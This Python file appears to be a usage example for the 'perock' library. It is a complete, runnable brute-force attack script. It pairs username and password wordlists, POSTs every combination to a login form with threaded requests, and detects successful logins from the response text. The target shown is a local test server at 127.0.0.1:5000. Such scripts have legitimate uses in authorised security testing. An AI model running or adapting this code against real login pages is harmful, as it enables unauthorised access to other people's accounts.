from perock import forcetable
from perock import attack
from perock import runner

import requests

import os 

# Sets up paths needed by this file
folder_path = os.path.split(os.path.abspath(__file__))[0]
asserts_path = os.path.join(folder_path, "asserts")

usernames_file = os.path.join(asserts_path, "usernames.txt")
passwords_file = os.path.join(asserts_path, "passwords.txt")


# Create field with usernames
usernames_field = forcetable.FieldFile("usernames", usernames_file)
usernames_field.set_item_name("username")

# Create with passwords
passwords_field = forcetable.FieldFile("passwords", passwords_file)
passwords_field.set_item_name("password")

# Create table and add fields
table = forcetable.Table()
table.add_field(usernames_field)
table.add_field(passwords_field)
# Sets usernames_field as primary field of table
table.set_primary_field(usernames_field)

# table will handle cartesian product of the fields
# tabe also contains records created from the fields


class LoginPageAttack(attack.Attack):
    def __init__(self, target, data: dict, retries=1) -> None:
        super().__init__(target, data, retries)
        # self._responce can also be None or Exception
        # Responce can be anything but None and Exception are special.
        self._responce: requests.Response
        self._session: requests.Session

    @classmethod
    def create_session(cls):
        # Creates session object to use with requests
        # That can improve request performance
        return requests.Session()

    def request(self):
        # Performs request with target and return responce
        if self.session_exists():
            session = self.get_session()
            return session.post(self._target, data=self._data)
        else:
            return requests.post(self._target, data=self._data)
            

    def failure(self):
        # Tests if attempt failed or not
        if self.target_reached():
            if b"Failed to login" in self._responce.content:
                return True
            elif b"No such username" in self._responce.content:
                return True
        return False

    def success(self):
        # Tests if attempt failed or not
        if self.target_reached():
            return b"Login successful" in self._responce.content
        return False

    def target_errors(self):
        if self.target_reached():
            return self._responce.status_code != 200
        return False


    def after_request(self):
        super().after_request()
        if self.failure():
            #print("Attempt failed:", self._data)
            pass
        elif self.success():
            print("Attempt success:", self._data)
        elif self.errors():
            print("Attempt errors:", self._data)
            print("Responce message:", self._responce_msg)


# Creates runner object to perform bruteforce
runner_object = runner.RunnerThread(LoginPageAttack)
runner_object.set_target('http://127.0.0.1:5000/login')
runner_object.set_table(table)

# Enables optimisation(requires primary field)
runner_object.enable_optimise()
runner_object.run()